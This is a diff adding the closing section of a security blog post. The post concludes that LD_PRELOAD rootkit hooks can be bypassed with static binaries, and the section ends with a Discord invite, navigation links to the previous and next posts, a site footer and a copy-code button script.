+<p>LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.</p>
+<p>If you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!</p>
+<blockquote>
+<p>Rootkit Researchers</p>
+</blockquote>
+<blockquote>
+<p><a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></p>
+</blockquote>
+
+  </div>
+
+  <footer class="art-foot">
+    <nav class="navlinks"><a class="prev" href="/hacking/gcc/"><span class="label">&lt;&lt; prev</span><br>ElfDoor-gcc</a><a class="next" href="/hacking/using-io-uring-to-break-linux-rootkits-hooks/"><span class="label">next &gt;&gt;</span><br>breaking ld_preload rootkit hooks</a>
+    </nav>
+  </footer>
+</article>
+    </main><footer class="foot">
+    <span>&copy; 2026 <a href="/">0xMatheuZ</a></span>
+    <span>built with <a href="https://gohugo.io/" target="_blank" rel="noopener">hugo</a> · handcrafted layouts</span>
+</footer>
+<script>
+document.querySelectorAll('pre > code').forEach((code) => {
+    const pre = code.parentNode;
+    const wrap = pre.parentNode;
+    const btn = document.createElement('button');
+    btn.className = 'copy-code';
+    btn.type = 'button';
+    btn.textContent = 'copy';
+    const done = () => { btn.textContent = 'copied'; setTimeout(() => btn.textContent = 'copy', 1600); };
+    btn.addEventListener('click', () => {
+        navigator.clipboard.writeText(code.textContent).then(done).catch(() => {});
+    });
+    const host = wrap.classList.contains('highlight') ? wrap : pre;
+    host.style.position = 'relative';
+    host.appendChild(btn);
+});
+</script>
+</body>
+</html>
